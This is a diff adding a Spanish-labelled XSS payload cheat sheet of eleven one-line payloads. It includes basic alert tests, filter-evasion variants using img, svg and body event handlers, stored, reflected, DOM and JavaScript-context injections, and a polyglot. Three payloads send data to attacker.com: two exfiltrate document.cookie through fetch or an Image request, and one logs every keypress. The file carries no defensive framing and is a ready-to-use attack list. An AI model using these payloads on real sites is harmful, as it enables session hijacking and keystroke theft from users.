@@ -1,0 +1,32 @@
+▶ Prueba Básica (Probar alerta simple):
+  <script>alert('XSS')</script>
+
+▶ Robo de Cookies (Enviar cookies al atacante):
+  <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+
+▶ Keylogger (Registrar teclas presionadas):
+  <script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key) }</script>
+
+▶ Evasión de Filtros (Evadir detección básica):
+  <img src=x onerror=alert('XSS')>
+
+▶ Evasión con SVG (Usar SVG para ejecutar):
+  <svg/onload=alert('XSS')>
+
+▶ XSS Almacenado (Persistir ataque):
+  <script>new Image().src="http://attacker.com/steal?cookie="+document.cookie;</script>
+
+▶ XSS Reflejado (Inyectar en URL):
+  http://ejemplo.com/search?q=<script>alert('XSS')</script>
+
+▶ XSS basado en DOM (Manipular DOM):
+  <script>document.write("<script>alert('XSS')</script>");</script>
+
+▶ XSS en Atributos (Ejecutar en eventos):
+  <body onload=alert('XSS')>
+
+▶ XSS en JavaScript (Inyectar en código JS):
+  ';alert('XSS');//
+
+▶ XSS Polyglot (Funcionan en múltiples contextos):
+  <script>/*<![CDATA[*/alert(1)/*]]>*/</script>
